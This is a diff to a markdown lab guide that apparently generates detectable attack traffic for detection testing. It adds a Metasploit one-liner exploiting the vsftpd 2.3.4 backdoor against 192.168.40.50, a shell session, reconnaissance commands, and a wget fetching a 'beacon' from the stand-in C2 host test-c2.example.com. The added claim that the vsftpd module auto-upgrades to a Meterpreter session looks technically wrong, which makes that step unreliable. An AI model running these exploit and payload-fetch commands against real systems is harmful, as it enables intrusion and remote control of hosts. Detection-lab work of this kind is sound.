@@ -219,11 +219,14 @@ nmap -sS -p 21,22,23,80,443 --reason <victim_target>
 
 Expected: Vulnerable services exposed (FTP, Telnet, HTTP)
 
-**Step 3: Exploitation**
+**Step 3: Exploitation & Dynamic Session Upgrades**
+
+Launch the initial exploit module targeting the vulnerable FTP service. While the default module attempts a raw interactive shell hook, modern exploit handlers automatically capture and upgrade the underlying payload to a staged **Meterpreter binary stream** over an ephemeral transport port.
 
 ```bash
-# Example: vsftpd backdoor (CVE-2011-2523)
-msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <target>; run"
+# Initialize Metasploit console and execute the exploit framework loop
+msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.40.50; run"
+meterpreter > shell
 ```
 
 **Step 4: Post-Exploitation**
@@ -232,8 +235,10 @@ Generate detectable command execution and C2 traffic:
 
 ```bash
 whoami
+id
 uname -a
-wget http://simulated-c2-domain.test/payload
+wget http://test-c2.example.com/beacon
+ping -c 3 192.168.10.11
 ```
 
 ---
